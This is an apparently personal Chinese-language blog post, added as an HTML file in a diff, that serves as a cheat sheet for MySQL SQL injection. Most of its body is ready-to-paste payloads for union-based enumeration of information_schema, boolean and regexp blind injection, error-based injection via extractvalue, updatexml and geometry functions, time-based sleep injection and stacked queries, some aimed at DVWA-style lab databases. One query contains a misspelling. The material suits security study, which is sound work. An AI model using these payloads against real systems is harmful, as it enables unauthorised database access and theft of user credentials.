@@ -1,0 +1,409 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+	<link rel="bookmark"  type="image/x-icon"  href="/img/logo_miccall.png"/>
+	<link rel="shortcut icon" href="/img/logo_miccall.png">
+	
+			    <title>
+    Hexo
+    </title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="/css/mic_main.css" />
+    <link rel="stylesheet" href="/css/dropdownMenu.css" />
+    <meta name="keywords" content="miccall" />
+    
+    	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	 
+    <noscript>
+        <link rel="stylesheet" href="/css/noscript.css" />
+    </noscript>
+    <style type="text/css">
+        body:before {
+          content: ' ';
+          position: fixed;
+          top: 0;
+          background: url('/img/bg.gif') center 0 no-repeat;
+          right: 0;
+          bottom: 0;
+          left: 0;
+          background-size: cover; 
+        }
+    </style>
+
+			    
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script async type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jquery.scrollex.min.js"></script>
+    <script src="/js/jquery.scrolly.min.js"></script>
+    <script src="/js/skel.min.js"></script>
+    <script src="/js/util.js"></script>
+    <script src="/js/main.js"></script>
+	
+<meta name="generator" content="Hexo 5.2.0"></head>
+    
+		
+<!-- Layouts -->
+
+
+
+<!--  代码渲染  -->
+<link rel="stylesheet" href="/css/prism_coy.css" />
+<link rel="stylesheet" href="/css/typo.css" />
+<!-- 文章页 -->
+<body class="is-loading">
+    <!-- Wrapper 外包 s-->
+    <div id="wrapper" class="fade-in">
+        <!-- Intro 头部显示 s -->
+        <!-- Intro 头部显示 e -->
+        <!-- Header 头部logo start -->
+        <header id="header">
+    <a href="/" class="logo">Yu Ting</a>
+</header>
+        <!-- Nav 导航条 start -->
+        <nav id="nav" class="special" >
+            <ul class="menu links" >
+			<!-- Homepage  主页  --> 
+			<li >
+	            <a href="/" rel="nofollow">主页</a>
+	        </li>
+			<!-- categories_name  分类   --> 
+	        
+	        <li class="active">
+	            <a href="#s1">分类</a>
+	                    <ul class="submenu">
+	                        <li>
+	                        
+	                    </ul>
+	        </li>
+	        
+	        <!-- archives  归档   --> 
+	        
+	        
+		        <!-- Pages 自定义   -->
+		        
+		        <li>
+		            <a href="/about/" title="简历">
+		                简历
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/group/" title="团队">
+		                团队
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/gallery/" title="图库">
+		                图库
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/tag/" title="标签">
+		                标签
+		            </a>
+		        </li>
+		        
+
+
+            </ul>
+            <!-- icons 图标   -->
+			<ul class="icons">
+                    
+                    <li>
+                        <a title="github" href="https://github.com/miccall" target="_blank" rel="noopener">
+                            <i class="icon fa fa-github"></i>
+                        </a>
+                    </li>
+                    
+                    <li>
+                        <a title="500px" href="http://500px.com" target="_blank" rel="noopener">
+                            <i class="icon fa fa-500px"></i>
+                        </a>
+                    </li>
+                    
+			</ul>
+</nav>
+
+        <div id="main" >
+            <div class ="post_page_title_img" style="height: 25rem;background-image: url();background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;" >
+                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2 >SQL基础</h2></a>
+            </div>
+            <!-- Post -->
+            <div class="typo" style="padding: 3rem;">
+                <h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><p>sql注入就是一种通过操作输入来修改后台操作语句达到执行恶意sql语句来进行攻击的技术。</p>
+<ul>
+<li><a href="#sql">SQL</a><ul>
+<li><a href="#%E5%88%86%E7%B1%BB">分类</a><ul>
+<li><a href="#%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B">变量类型</a></li>
+<li><a href="#http%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F">HTTP提交方式</a></li>
+<li><a href="#%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F">注入方式</a></li>
+<li><a href="#%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98">编码问题</a></li>
+</ul>
+</li>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%95%B0%E6%8D%AE%E5%BA%93mysql-50%E4%BB%A5%E4%B8%8A">信息数据库（MySql 5.0以上）</a><ul>
+<li><a href="#information_schema"><strong>information_schema</strong></a></li>
+<li><a href="#schemata%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><strong>SCHEMATA</strong>(所有数据库的基本信息)</a></li>
+<li><a href="#tables%E5%AD%98%E5%82%A8%E8%A1%A8%E4%BF%A1%E6%81%AF"><strong>TABLES</strong>(存储表信息)</a></li>
+<li><a href="#columns%E5%82%A8%E5%AD%98%E5%88%97%E4%BF%A1%E6%81%AF"><strong>COLUMNS</strong>(储存列信息)</a></li>
+<li><a href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9E%E6%8E%A5%E5%87%BD%E6%95%B0">字符串连接函数</a></li>
+</ul>
+</li>
+<li><a href="#%E5%9F%BA%E6%9C%AC%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B">基本手工注入流程</a><ul>
+<li><a href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E6%95%B0">获取字段数</a></li>
+<li><a href="#%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D">获取系统数据库名</a></li>
+<li><a href="#%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D">获取当前数据库名</a></li>
+<li><a href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E8%A1%A8">获取数据库中的表</a></li>
+<li><a href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%AD%97%E6%AE%B5">获取表中的字段</a></li>
+<li><a href="#%E8%8E%B7%E5%8F%96%E5%90%84%E4%B8%AA%E5%AD%97%E6%AE%B5%E7%9A%84%E5%80%BC">获取各个字段的值</a></li>
+</ul>
+</li>
+<li><a href="#%E5%B8%B8%E7%94%A8%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F">常用注入方式</a><ul>
+<li><a href="#union%E6%B3%A8%E5%85%A5">union注入</a></li>
+<li><a href="#%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5%E6%9E%84%E9%80%A0%E9%80%BB%E8%BE%91%E5%88%A4%E6%96%AD">布尔注入(构造逻辑判断)</a><ul>
+<li><a href="#regexp%E6%AD%A3%E5%88%99%E6%B3%A8%E5%85%A5">regexp正则注入</a></li>
+<li><a href="#like%E5%8C%B9%E9%85%8D%E6%B3%A8%E5%85%A5">like匹配注入</a></li>
+</ul>
+</li>
+<li><a href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">报错注入</a><ul>
+<li><a href="#floor%E5%92%8Crand">floor()和rand()</a></li>
+<li><a href="#extractvalue">extractvalue()</a></li>
+<li><a href="#updatexml">updatexml()</a></li>
+<li><a href="#geometrycollection">geometrycollection()</a></li>
+<li><a href="#multipoint">multipoint()</a></li>
+<li><a href="#polygon">polygon()</a></li>
+<li><a href="#multipolygon">multipolygon()</a></li>
+<li><a href="#linestring">linestring()</a></li>
+<li><a href="#multilinestring">multilinestring()</a></li>
+<li><a href="#exp">exp()</a></li>
+</ul>
+</li>
+<li><a href="#%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5">时间注入</a></li>
+<li><a href="#%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5">堆叠查询注入</a></li>
+<li><a href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5">二次注入</a></li>
+<li><a href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5">宽字节注入</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h4 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h4><ul>
+<li>数字型</li>
+<li>字符型</li>
+</ul>
+<h4 id="HTTP提交方式"><a href="#HTTP提交方式" class="headerlink" title="HTTP提交方式"></a>HTTP提交方式</h4><ul>
+<li>GET注入</li>
+<li>POST注入</li>
+<li>Cookie注入</li>
+</ul>
+<h4 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h4><ul>
+<li>报错注入</li>
+<li>盲注<ul>
+<li>布尔盲注</li>
+<li>时间盲注</li>
+</ul>
+</li>
+<li>union注入</li>
+</ul>
+<h4 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h4><ul>
+<li>宽字节注入</li>
+</ul>
+<h2 id="信息数据库（MySql-5-0以上）"><a href="#信息数据库（MySql-5-0以上）" class="headerlink" title="信息数据库（MySql 5.0以上）"></a>信息数据库（MySql 5.0以上）</h2><h4 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a><strong>information_schema</strong></h4><p>系统数据库，记录当前数据库的数据库，表，列，用户权限信息。</p>
+<h4 id="SCHEMATA-所有数据库的基本信息"><a href="#SCHEMATA-所有数据库的基本信息" class="headerlink" title="SCHEMATA(所有数据库的基本信息)"></a><strong>SCHEMATA</strong>(所有数据库的基本信息)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查询数据库：union select 1,2,group_concat(schema_name) from information_schema.schemata </span><br></pre></td></tr></table></figure>
+
+<h4 id="TABLES-存储表信息"><a href="#TABLES-存储表信息" class="headerlink" title="TABLES(存储表信息)"></a><strong>TABLES</strong>(存储表信息)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询表： union select 1,2,group_concat(table_name) from</span><br><span class="line">information_schema.tables where table_schema&#x3D;&#39;表名&#39; </span><br></pre></td></tr></table></figure>
+
+<h4 id="COLUMNS-储存列信息"><a href="#COLUMNS-储存列信息" class="headerlink" title="COLUMNS(储存列信息)"></a><strong>COLUMNS</strong>(储存列信息)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查询列：union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;表名&#39; </span><br></pre></td></tr></table></figure>
+
+<h4 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h4><p>  concat(str1,str2,…)——没有分隔符地连接字符串</p>
+<p>  concata_ws(separator,str1,str2,…)——含有分隔符地连接字符串</p>
+<p>  group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据</p>
+<h2 id="基本手工注入流程"><a href="#基本手工注入流程" class="headerlink" title="基本手工注入流程"></a>基本手工注入流程</h2><h4 id="获取字段数"><a href="#获取字段数" class="headerlink" title="获取字段数"></a>获取字段数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by n</span><br></pre></td></tr></table></figure>
+
+<h4 id="获取系统数据库名"><a href="#获取系统数据库名" class="headerlink" title="获取系统数据库名"></a>获取系统数据库名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,schema_name from information_schema.schemata</span><br></pre></td></tr></table></figure>
+
+<h4 id="获取当前数据库名"><a href="#获取当前数据库名" class="headerlink" title="获取当前数据库名"></a>获取当前数据库名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3,database()</span><br></pre></td></tr></table></figure>
+
+<h4 id="获取数据库中的表"><a href="#获取数据库中的表" class="headerlink" title="获取数据库中的表"></a>获取数据库中的表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()</span><br></pre></td></tr></table></figure>
+
+<p>or</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1</span><br></pre></td></tr></table></figure>
+
+<p>但法二需一一查询表名。</p>
+<h4 id="获取表中的字段"><a href="#获取表中的字段" class="headerlink" title="获取表中的字段"></a>获取表中的字段</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,group_concat(column_name) from information_shema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;表名&#39;</span><br></pre></td></tr></table></figure>
+
+<h4 id="获取各个字段的值"><a href="#获取各个字段的值" class="headerlink" title="获取各个字段的值"></a>获取各个字段的值</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,group_concat(username,password) from users&#x2F;&#x2F;假设已经获取到表名为user，且字段为username和password</span><br></pre></td></tr></table></figure>
+
+<h2 id="常用注入方式"><a href="#常用注入方式" class="headerlink" title="常用注入方式"></a>常用注入方式</h2><h3 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h3><p>union的作用是将两个sql语句进行联合。当注入参数的数据在数据库中不存在时，两个sql语句进行联合操作时，前一个语句选择的内容为空时，后面语句的查询内容就显示出来。如:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id &#x3D;-1 union select 1,2,3 </span><br></pre></td></tr></table></figure>
+
+<h3 id="布尔注入-构造逻辑判断"><a href="#布尔注入-构造逻辑判断" class="headerlink" title="布尔注入(构造逻辑判断)"></a>布尔注入(构造逻辑判断)</h3><p>boolean 根据注入信息返回true or fales,无任何报错</p>
+<p><strong>相关函数</strong></p>
+<p><strong>length(str)</strong> ：返回字符串str的长度</p>
+<p><strong>substr(str, pos, len)</strong> ：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始</p>
+<p><strong>mid(str,pos,len)</strong> ：跟substr一样，截取字符串</p>
+<p><strong>ascii(str)</strong> ：返回字符串str的最左面字符的ASCII代码值</p>
+<p><strong>ord(str)</strong> ：将字符或布尔类型转成ascll码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#39; and length (database())&#x3D;x(某个值，用大于或者小于某个值也可以)--+&#x2F;&#x2F;猜数据库名长度：(猜对时页面才会显示正常)</span><br><span class="line"></span><br><span class="line">&#39; and length((select schema_name from information_schema.schemata limit 0,1))&#x3D;18 --+ &#x2F;&#x2F;查询所有数据库的长度</span><br><span class="line"></span><br><span class="line">&#39; and left(database(),1)&#x3D;&#39;s&#39;--+ &#x2F;&#x2F;猜数据库的名字 </span><br><span class="line"></span><br><span class="line">&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1)) &#x3D; 101--+&#x2F;&#x2F;获取数据库下的表</span><br><span class="line"></span><br><span class="line">&#39; and length((select table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39; limit 0,1))&#x3D;9 --+ 查询表的长度</span><br><span class="line"></span><br><span class="line">&#39; and 1&#x3D;(select 1 from information_schema.columns where table_name&#x3D;&#39;users&#39; and column_name regexp &#39;^us[a-z]&#39; limit 0,1)--+&#x2F;&#x2F;获取表里的列名</span><br><span class="line"></span><br><span class="line">&#39; and length((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&quot;users&quot;limit 0,1))&gt;1 --+ &#x2F;&#x2F;查询列的长度</span><br><span class="line"></span><br><span class="line">&#39; and ord(mid((select ifnull(cast(username as char),x（错误返回值）)from security.users order by id limit 0,1),1,1))&#x3D;68--+ &#x2F;&#x2F;获取列的内容</span><br></pre></td></tr></table></figure>
+
+<h4 id="regexp正则注入"><a href="#regexp正则注入" class="headerlink" title="regexp正则注入"></a>regexp正则注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#39; and 1&#x3D;(user() regexpri&#39;^&#39;) --+&#x2F;&#x2F;查看当前操作的用户</span><br><span class="line"> </span><br><span class="line">&#39; and 1&#x3D;(database() regexp&#39;^s&#39;) --+&#x2F;&#x2F;查看当前数据库</span><br><span class="line"></span><br><span class="line">&#39; and ((select schema_name from information_schema.schemata limit 0,1) regexp&#39;^i[a-z]&#39; )&#x3D;1 --+&#x2F;&#x2F;正则猜测第一个数据库的名字</span><br><span class="line"> </span><br><span class="line">&#39; and ((select table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39; limit 0,1)regexp &#39;^g[a-z]&#39; )&#x3D;1 --+&#x2F;&#x2F;正则猜测dvwa数据库里第一个表的名字</span><br><span class="line"> </span><br><span class="line">&#39; and ((select column_name from information_schema.columns where table_schema&#x3D;&#39;dvwa&#39; and table_name&#x3D;&#39;users&#39; limit 0,1) regexp &#39;^u[a-z]&#39; )&#x3D;1 --+&#x2F;&#x2F;正则猜测dvwa数据库里的users表里的第一个值</span><br><span class="line"> </span><br><span class="line">&#39; and ((select user from dvwa.users limit 0,1) regexp &#39;^a[a-z]&#39; )&#x3D;1 --+&#x2F;&#x2F;正则猜测dvwa数据库里的users表里的user字段里的第一个值</span><br></pre></td></tr></table></figure>
+
+<h4 id="like匹配注入"><a href="#like匹配注入" class="headerlink" title="like匹配注入"></a>like匹配注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user() like &#39;ro%&#39;</span><br></pre></td></tr></table></figure>
+
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="floor-和rand"><a href="#floor-和rand" class="headerlink" title="floor()和rand()"></a>floor()和rand()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a   &#x2F;&#x2F;利用错误信息得到当前数据库名</span><br></pre></td></tr></table></figure>
+
+<h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and extractvalue(1,concat(0x7e,(select user()),0x7e))</span><br></pre></td></tr></table></figure>
+
+<h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and updatexml(1,concat(0x7e,(select user()),0x7e),1)</span><br></pre></td></tr></table></figure>
+
+<h4 id="geometrycollection"><a href="#geometrycollection" class="headerlink" title="geometrycollection()"></a>geometrycollection()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+
+<h4 id="multipoint"><a href="#multipoint" class="headerlink" title="multipoint()"></a>multipoint()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and multipoint((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+
+<h4 id="polygon"><a href="#polygon" class="headerlink" title="polygon()"></a>polygon()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and polygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+
+<h4 id="multipolygon"><a href="#multipolygon" class="headerlink" title="multipolygon()"></a>multipolygon()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+
+<h4 id="linestring"><a href="#linestring" class="headerlink" title="linestring()"></a>linestring()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and linestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+
+<h4 id="multilinestring"><a href="#multilinestring" class="headerlink" title="multilinestring()"></a>multilinestring()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and exp(~(select * from(select user())a))</span><br></pre></td></tr></table></figure>
+
+<h3 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If(ascii(substr(database(),1,1))&gt;115,0,sleep(5)) --+&#x2F;&#x2F;如果前面执行的正确执行0就为假 ,如果前面错误则执行后面sleep(5)延迟5秒</span><br></pre></td></tr></table></figure>
+
+<h3 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id &#x3D; 1&#39;;select if(sub(user(),1,1)&#x3D;&#39;r&#39;,sleep(3),1)%23</span><br></pre></td></tr></table></figure>
+
+<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p><img src="/2020/11/08/SQL/%E5%95%A6%E5%95%A6%E5%95%A6.jpg" alt="啦啦啦"></p>
+<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p><img src="/2020/11/08/SQL/%E5%93%88%E5%93%88%E5%93%88.jpg" alt="哈哈哈"></p>
+
+            </div>
+
+            <!-- Post Comments -->
+            
+    <!-- 使用 DISQUS_CLICK -->
+<div id="disqus-comment">
+    <div id="disqus_thread"></div>
+
+<!-- add animation -->
+<style>
+	.disqus_click_btn {
+            line-height: 30px;
+            margin: 0;
+            min-width: 50px;
+            padding: 0 14px;
+            display: inline-block;
+            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            text-transform: uppercase;
+            letter-spacing: 0;
+            overflow: hidden;
+            will-change: box-shadow;
+            transition: box-shadow .2s cubic-bezier(.4, 0, 1, 1), background-color .2s cubic-bezier(.4, 0, .2, 1), color .2s cubic-bezier(.4, 0, .2, 1);
+            outline: 0;
+            cursor: pointer;
+            text-decoration: none;
+            text-align: center;
+            vertical-align: middle;
+            border: 0;
+            background: rgba(158, 158, 158, .2);
+            box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .14), 0 3px 1px -2px rgba(0, 0, 0, .2), 0 1px 5px 0 rgba(0, 0, 0, .12);
+            color: #fff;
+            background-color: #7EC0EE;
+            text-shadow: 0
+        }
+</style>
+	
+<div class="btn_click_load" id="disqus_bt"> 
+    <button class="disqus_click_btn">点击查看评论</button>
+</div>
+
+<!--
+<script type="text/javascript">
+$('.btn_click_load').click(function() {
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'http-miccall-tech'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+
+    document.getElementById('disqus_bt').style.display = "none";
+});
+</script>
+-->
+<script type="text/javascript">
+    var disqus_config = function () {
+        this.page.url = 'http://liquor-boop.github.io/2020/11/08/SQL/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'http://liquor-boop.github.io/2020/11/08/SQL/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+</script>
+
+<script type="text/javascript">
+    $('.btn_click_load').click(function() {  //click to load comments
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document;
+            var s = d.createElement('script');
+            s.src = '//http-miccall-tech.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', + new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+        $('.btn_click_load').css('display','none');
+    });
+</script>
+</div>
+<style>
+    #disqus-comment{
+        background-color: #eee;
+        padding: 2pc;
+    }
+</style>
+
+
+        </div>
+        <!-- Copyright 版权 start -->
+                <div id="copyright">
+            <ul>
+                <li>&copy;Powered By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/" style="border-bottom: none;">hexo</a></li>
+                <li>Design: <a target="_blank" rel="noopener" href="http://miccall.tech " style="border-bottom: none;">miccall</a></li>
+            </ul>
+            
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+			
+        </div>
+    </div>
+</body>
+
+
+
+ 	
+</html>
